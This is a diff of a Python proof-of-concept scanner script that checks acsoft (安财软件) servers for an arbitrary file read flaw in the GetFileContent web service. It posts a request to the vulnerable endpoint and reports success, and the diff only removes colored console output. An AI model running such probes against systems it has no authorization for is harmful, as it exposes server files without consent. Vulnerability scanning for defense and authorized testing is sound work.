@@ -9,8 +9,6 @@ description: 文件/WS/WebService.asmx/GetFileContent中,参数fileName存在任
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
 
 class acsoft_GetFileContent_fileread_BaseVerify:
     def __init__(self, url):
@@ -29,16 +27,12 @@ class acsoft_GetFileContent_fileread_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
-                cprint("[+]存在安财软件GetFileContent任意文件读取漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
                 return True,vulnurl,"安财软件GetFileContent任意文件读取",payload,req.text
             else:
-                cprint("[-]不存在acsoft_GetFileContent_fileread漏洞", "white", "on_grey")
                 return False,None,None,None,None
         except:
-            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
             return False, None, None, None, None
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
     testVuln = acsoft_GetFileContent_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
